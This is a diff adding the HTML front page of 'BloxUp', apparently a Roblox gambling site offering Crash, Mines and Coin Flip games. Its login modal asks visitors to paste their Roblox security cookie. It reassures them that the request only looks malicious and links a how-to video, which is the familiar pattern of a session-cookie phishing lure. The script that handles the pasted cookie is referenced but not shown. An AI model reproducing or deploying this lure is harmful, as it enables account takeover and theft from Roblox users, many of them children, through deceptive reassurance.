@@ -1,0 +1,157 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>BloxUp</title>
+  <meta name="description" content="BloxUp">
+  <meta name="author" content="SitePoint">
+
+  <meta property="og:title" content="BloxUp">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="">
+  <meta property="og:description" content="">
+  <meta property="og:image" content="image.png">
+
+  <link rel="icon" href="/favicon.ico">
+  <link rel="icon" href="/favicon.svg" intype="image/svg+xml">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/popup.css">
+  <link rel="stylesheet" href="css/inputfield.css">
+  <link rel="stylesheet" href="css/coinflip.css">
+</head>
+
+<body onload="startfunction()">
+
+
+
+<div style="float: left; width: 250px;">
+
+<h1 style="color:white; font-size:48px; text-align: center;">BloxUp</h1>
+<button class="loginbutton" style="color:white; width:100%;" data-modal-target="#modal">Login</button>
+<div id="chat-form">
+  <div class="form-box">
+    <div class="chat-box">
+      <div class="message-con">
+         <ul id="messages"></ul>
+      </div>
+    </div>
+  </div>
+</div>
+ 
+
+
+</div>
+
+</div>
+
+<div class="tab">
+  <button style="font-size:20px;" class="tablinks" onclick="opencrash()">Crash</button>
+  <button style="font-size:20px;" class="tablinks" onclick="openmines()">Mines</button>
+  <button style="font-size:20px;" class="tablinks" onclick="openslots()">Towers</button>
+  <button style="font-size:20px;" class="tablinks" onclick="opencoinflip()">Coin Flip</button>
+<button class="loginbutton" style="float: right; padding:20px;  margin-right:20px;color:white; background-color: #3884fc; width:12%;" data-modal-target="#modal">Login</button>
+</div>
+
+
+
+
+<div id="coindiv">
+<h1 style="text-align: center;">Work In Progress...</h1>
+</div>
+
+
+<div id="slotsdiv">
+<h1 style="text-align: center;">Work In Progress...</h1>
+</div>
+
+
+
+
+<div id="minesdiv">
+<h1 style="text-align: center;">Work In Progress...</h1>
+</div>
+
+
+<div style="text-align:center;" id="crashdiv">
+<h1 id="multiplier" style="text-align: center; font-size:80px;">1.00</h1><br>
+<button id="startcrash" class="startcrash" onclick="startcrash()">Start Crash</button>
+<button class="cashoutbutton" style="width:5%;" onclick="cashout()">Cashout</button>
+
+<input id="crashbetinput" style="width:12%;" type="text" placeholder="Bet Amount"></input>
+
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+
+<div class="modal" id="modal">
+<div id="modal-body" class="modal-body">
+<a class="title">Finish Logging In</a><br><br>
+<a>In order for BloxUp to operate correctly, we require access to your Roblox account.</a>
+<br>
+<br>
+<a>
+While normally asking for such would be considered malicious, we assure you that BloxUp not only will protect your security but never use it without your permission! We will never store your password on our systems. For further assistance on logging in watch <a href="https://www.youtube.com/watch?v=9n7YnBOzFPc">this</a><a> video.</a><br>
+
+<br><input type="text" id="input" name="input" placeholder="Insert Roblosecurity Cookie Here">
+<input type="checkbox" id="tos" name="tos" class="checkmark">
+
+<label for="tos"><a>By checking this box you agree to our terms of service</a></label>
+
+
+<button class="loginbutton login" data-close-button onclick="loginfunc()"  data-modal-target="#modal">Login</button>
+
+    </div>
+  </div>
+  <div id="overlay"></div>
+
+
+
+</a>
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="js/coinflip.js"></script>
+<script src="js/popup.js"></script>
+<script src="js/login.js"></script>
+<script src="js/script.js"></script>
+<script src="js/coinflip.js"></script>
+<script src="js/crash.js"></script>
+
+<script>
+coindiv.style.display = "none";
+slotsdiv.style.display = "none";
+minesdiv.style.display = "none";
+crashdiv.style.display = "block";
+
+if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+ alert('You must be on desktop for this website to work properly.')
+}
+
+
+</script>
+</body>
+</html>
